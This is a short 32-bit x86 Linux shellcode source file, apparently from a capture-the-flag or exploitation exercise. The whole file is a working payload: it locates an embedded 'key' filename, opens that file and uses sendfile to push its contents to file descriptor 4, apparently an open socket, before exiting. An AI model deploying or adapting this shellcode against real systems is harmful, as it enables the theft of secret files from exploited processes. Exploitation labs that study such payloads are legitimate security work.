BITS 32
GLOBAL _start
_start:
    jmp get_eip
 
run:
    xor eax, eax
    xor edi, edi
    xor edx, edx
 
    ; fd = sys_open(filename, 0, 0)
    mov eax, 5    ; sys_open
    pop ebx       ; filename
    xor ecx, ecx  ; flags = 0
    xor edx, edx  ; mode = 0
    int 0x80

    ; sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
    mov ecx, eax  ; in_fd
    xor eax, eax 
    mov al, 0xbb  ; sendfile() syscall
    mov ebx, 4    ; out_fd
    xor edx, edx  ; offset = 0
    mov esi, 1024 ; size
    int 0x80

    ; sys_exit(0)
    xor eax, eax
    mov al, 1 ;exit the shellcode
    xor ebx,ebx
    int 0x80

get_eip:
    call run            ; put address of our message onto the stack
 
filename:
    db 'key', 0x0
